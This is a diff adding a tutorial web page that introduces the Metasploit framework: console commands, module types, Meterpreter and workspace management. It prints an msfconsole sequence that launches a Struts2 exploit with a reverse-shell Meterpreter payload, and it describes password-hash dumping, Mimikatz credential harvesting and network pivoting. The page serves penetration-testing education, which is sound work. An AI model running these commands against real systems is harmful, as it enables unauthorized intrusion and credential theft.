@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Metasploit Framework Basics — Tech Library</title>
+ <meta name="last-updated" content="2026-05-29">
+  <meta property="og:title" content="Metasploit Framework Basics">
+  <meta property="og:description" content="Get started with Metasploit — the most widely used exploitation framework for penetration testing and red team operations.">
+  <meta property="og:url" content="https://tech-library.example.com/tutorials/metasploit-basics.html">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Tech Library">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Metasploit Framework Basics">
+  <meta name="twitter:description" content="Get started with Metasploit — the most widely used exploitation framework for penetration testing and red team operations.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+ <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Fira+Code&display=optional" rel="stylesheet">
+ <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+ <link rel="stylesheet" href="../assets/style.css">
+ <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+</head>
+<body><script>!function(){try{var t=localStorage.getItem("colorTheme")||"",d=localStorage.getItem("theme");if(t)document.body.classList.add("theme-"+t);if(d!=="light")document.body.classList.add("dark-mode")}catch(e){}}()</script>
+<a class="skip-to-content" href="#main-content">Skip to content</a>
+
+     <nav class="navbar" id="navbar">
+   <div class="nav-container">
+    <a href="../index.html" class="nav-logo"><i class="fas fa-cube"></i> Tech Library</a>
+    <ul class="nav-menu">
+          <li><a href="../index.html"><i class="fas fa-home"></i> Home</a></li>
+          <li><a href="../tutorials/index.html" class="active"><i class="fas fa-book"></i> Tutorials</a></li>
+          <li><a href="../resources/index.html"><i class="fas fa-folder-open"></i> Resources</a></li>
+          <li><a href="../lexicon/index.html"><i class="fas fa-book-open"></i> Lexicon</a></li>
+          <li><a href="../survival/index.html"><i class="fas fa-life-ring"></i> Survival</a></li>
+          <li><a href="../piracy/index.html"><i class="fas fa-skull"></i> Piracy</a></li>
+          <li class="nav-search-item"><div class="nav-search-bar" id="search-bar"><i class="fas fa-search"></i><input type="text" id="search-bar-input" placeholder="Search tutorials, terms..." autocomplete="off"><span class="kbd-hint">⌘K</span></div></li>
+          <li><button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode"><i class="fas fa-moon"></i></button></li>
+        </ul>
+    <div class="hamburger" id="hamburger">
+     <span></span>
+     <span></span>
+     <span></span>
+    </div>
+   </div>
+  </nav>
+<div class="container" style="padding-top:100px;padding-bottom:60px;">
+<main id="main-content" class="main-content" style="max-width:960px;margin:0 auto;">
+<nav class="breadcrumb" aria-label="Breadcrumb"><a href="../index.html"><i class="fas fa-home"></i> Home</a><span class="breadcrumb-sep">›</span><a href="../tutorials/index.html">Tutorials</a><span class="breadcrumb-sep">›</span><span>Metasploit Framework Basics — Tech Library</span></nav>
+<div class="section-header" style="text-align:left;margin-bottom:32px;">
+<span class="section-badge"><i class="fas fa-shield-alt"></i> Security</span>
+<h1 class="section-title" style="font-size:2rem;">Metasploit Framework Basics</h1>
+<p style="color:var(--text-secondary);">Get started with Metasploit — the most widely used exploitation framework for penetration testing and red team operations.</p>
+<div class="toc" style="background:var(--code-bg);border:1px solid var(--border-color);border-radius:12px;padding:20px 24px;margin-bottom:32px;">
+ <h3 style="margin:0 0 8px 0;font-size:1.1rem;"><i class="fas fa-list"></i> Table of Contents <span style="font-weight:400;font-size:0.85rem;color:var(--text-secondary);">(5 sections)</span></h3>
+ <ul style="columns:2 280px;column-gap:32px;margin:8px 0 0 0;padding-left:20px;">
+  <li><a href="#framework-overview">Framework Overview</a></li>
+  <li><a href="#modules-architecture">Modules Architecture</a></li>
+  <li><a href="#meterpreter-payloads">Meterpreter Payloads</a></li>
+  <li><a href="#post-exploitation">Post-Exploitation</a></li>
+  <li><a href="#database-and-workspace-management">Database and Workspace Management</a></li>
+ </ul>
+</div>
+</div>
+
+<h2 id="framework-overview"><i class="fas fa-shield-alt"></i> Framework Overview</h2>
+<p>Metasploit is an open-source exploitation framework developed by Rapid7. It provides a complete environment for writing, testing, and executing exploit code against remote targets. The framework consists of hundreds of modules organized into exploits, payloads, encoders, nops, and post-exploitation tools. It runs on Linux (preferred), macOS, and Windows.</p><p>Launch the console with <code>msfconsole</code>. This interactive shell gives you access to all framework commands. The <code>help</code> command lists available modules and categories. Core commands include <code>search</code> (find modules), <code>use</code> (select a module), <code>show options</code> (view configurable parameters), <code>set</code> (assign a value), and <code>run</code>/<code>exploit</code> (execute the module).</p><ul><li><code>msfconsole</code> — main command-line interface</li><li><code>msfdb init</code> — initialize the backend database for workspace management</li><li><code>workspace -a &lt;name&gt;</code> — create isolated workspaces per engagement</li></ul>
+
+<h2 id="modules-architecture"><i class="fas fa-shield-alt"></i> Modules Architecture</h2>
+<p>Metasploit modules follow a standardized directory structure. The <strong>exploit</strong> module delivers the attack payload to a target. <strong>Payload</strong> modules define what runs on the compromised system (reverse shell, meterpreter, bind shell, etc.). <strong>Auxiliary</strong> modules perform scanning, fuzzing, and information gathering without exploitation. <strong>Post</strong> modules handle post-exploitation tasks like privilege escalation and credential dumping.</p><p>Each module has configurable options: <code>RHOSTS</code> (target IP), <code>RPORT</code> (target port), <code>TARGET</code> (specific platform/version), and <code>PAYLOAD</code> (what to execute). Use the <code>info</code> command to view module details, references, and disclosure dates. The <code>check</code> command tests if a target is vulnerable without exploiting it.</p><pre><code>msf6 > use exploit/multi/http/struts2_content_type_ognl
+msf6 > set RHOSTS 192.168.1.105
+msf6 > set TARGET 0
+msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 10.0.0.5
+msf6 > exploit</code></pre>
+
+<h2 id="meterpreter-payloads"><i class="fas fa-shield-alt"></i> Meterpreter Payloads</h2>
+<p>Meterpreter is Metasploit's advanced payload that operates entirely in memory (fileless). It provides a rich command set for post-exploitation without touching disk. After a successful exploit, you get a Meterpreter shell — an interactive environment for running commands on the target.</p><p>Key Meterpreter commands include <code>sysinfo</code> (OS and architecture), <code>getuid</code> (current user), <code>ps</code> (process listing), <code>migrate</code> (move to another process), <code>hashdump</code> (dump password hashes), and <code>shell</code> (drop into a system command shell). The <code>background</code> command sends the session to the background, letting you run other modules while keeping the session alive.</p><ul><li><code>sysinfo</code> — OS version, architecture, computer name</li><li><code>search -f *.txt</code> — search for files matching a pattern</li><li><code>upload /tmp/script.sh</code> — upload files to the target</li><li><code>load kiwi</code> — load Mimikatz for credential harvesting</li></ul>
+
+<h2 id="post-exploitation"><i class="fas fa-shield-alt"></i> Post-Exploitation</h2>
+<p>After gaining a foothold, Metasploit post-exploitation modules help you pivot, escalate privileges, and extract data. The <code>post/</code> directory contains modules organized by category: <code>windows/gather/</code>, <code>linux/gather/</code>, and <code>multi/manage/</code>.</p><p>Common post-exploitation workflows include running <code>post/multi/recon/local_exploit_suggester</code> to find privilege escalation vectors, using <code>kiwi</code> (Mimikatz) on Windows to extract plaintext credentials, and setting up routing through compromised hosts to reach internal networks with <code>route add</code>. Always document findings with timestamps and screenshots for reporting.</p><pre><code># Run exploit suggester on active session
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 > set SESSION 1
+msf6 > run
+
+# Pivot through compromised host
+msf6 > route add 10.0.0.0/24 1</code></pre>
+
+<h2 id="database-and-workspace-management"><i class="fas fa-shield-alt"></i> Database and Workspace Management</h2>
+<p>Metasploit integrates with a PostgreSQL database to store scan results, credentials, and session data. Initialize the database with <code>msfdb init</code>. Workspaces keep engagements isolated — use <code>workspace -a &lt;name&gt;</code> to create one, <code>workspace &lt;name&gt;</code> to switch, and <code>workspace -d &lt;name&gt;</code> to delete.</p><p>Database-backed commands include <code>db_nmap</code> (run Nmap and store results), <code>hosts</code> (list discovered hosts), <code>services</code> (list open ports), <code>vulns</code> (list vulnerabilities), <code>creds</code> (list captured credentials), and <code>loot</code> (list downloaded files). This structured storage makes it easy to generate engagement reports with <code>pro_workspace_generate_report</code>.</p><p>Regularly back up your MSF database with <code>msfdb export</code> and use <code>resource</code> scripts to automate repetitive tasks across engagements.</p>
+
+<hr style="margin:48px 0;border-color:var(--border-color);">
+<h2><i class="fas fa-book-open"></i> Further Reading &amp; References</h2>
+<p>Expand your knowledge with these official documentation and community resources:</p>
+<ul>
+ <li><a href="https://docs.metasploit.com/" target="_blank" rel="noopener"><strong>Metasploit Documentation</strong></a> — Official Rapid7 documentation covering installation, modules, and advanced usage.</li>
+ <li><a href="https://www.offsec.com/courses/pen-200/" target="_blank" rel="noopener"><strong>Offensive Security Training</strong></a> — Practical penetration testing courses built around Metasploit.</li>
+ <li><a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener"><strong>Metasploit Unleashed</strong></a> — Free online guide to Metasploit from Offensive Security.</li>
+</ul>
+<div class="alert alert-info" style="margin-top:16px;">
+ <i class="fas fa-info-circle alert-icon"></i>
+ <div><strong>Note:</strong> Links were current at the time of writing. Some resources may have moved — use your search engine if a link is broken.</div>
+</div>
+<hr style="margin:32px 0;border-color:var(--border-color);">
+<div style="display:flex;flex-wrap:wrap;gap:12px;justify-content:space-between;align-items:center;">
+<a href="index.html" class="card-link" style="font-size:1rem;"><i class="fas fa-arrow-left"></i> Back to Tutorials</a>
+<div style="display:flex;gap:10px;">
+<a href="../index.html" class="card-link"><i class="fas fa-home"></i> Home</a>
+<a href="../resources/index.html" class="card-link"><i class="fas fa-folder-open"></i> Resources</a>
+</div>
+</div>
+</main>
+</div>
+
+     <footer class="footer">
+   <div class="container">
+    <div class="footer-content">
+     <div class="footer-brand">
+      <h3><i class="fas fa-cube"></i> Tech Library</h3>
+      <p>Free tech tutorials, tools, and resources — curated and organized.</p>
+     </div>
+     <div class="footer-links">
+          <a href="../index.html">Home</a>
+          <a href="../tutorials/index.html">Tutorials</a>
+          <a href="../resources/index.html">Resources</a>
+          <a href="../survival/index.html">Survival</a>
+          <a href="../piracy/index.html">Piracy</a>
+          <a href="../lexicon/index.html">Lexicon</a>
+        </div>
+    </div>
+    <div class="footer-bottom"><p>&copy; 2026 Tech Library. Made with <i class="fas fa-heart" style="color:#ef4444;"></i> by <a href="https://github.com/SchooiCodes" target="_blank" style="color:rgba(255,255,255,0.7);text-decoration:underline;">SchooiCodes</a></p><div class="footer-social-inline"><a href="https://github.com/SchooiCodes" class="social-link github" target="_blank" rel="noopener" title="GitHub @SchooiCodes"><i class="fab fa-github"></i></a><span class="social-link discord" title="Discord @schooi."><i class="fab fa-discord"></i></span><a href="https://youtube.com/@SchooiYT" class="social-link youtube" target="_blank" rel="noopener" title="YouTube @SchooiYT"><i class="fab fa-youtube"></i></a></div><a href="#" class="back-to-top" aria-label="Back to top" title="Back to top"><i class="fas fa-arrow-up"></i></a></div>
+   </div>
+  </footer>
+<script src="../assets/scripts.js" defer></script>
+<script src="../assets/settings.js" defer></script>
+<script src="../assets/assistant.js" defer></script>
+</body>
+</html>
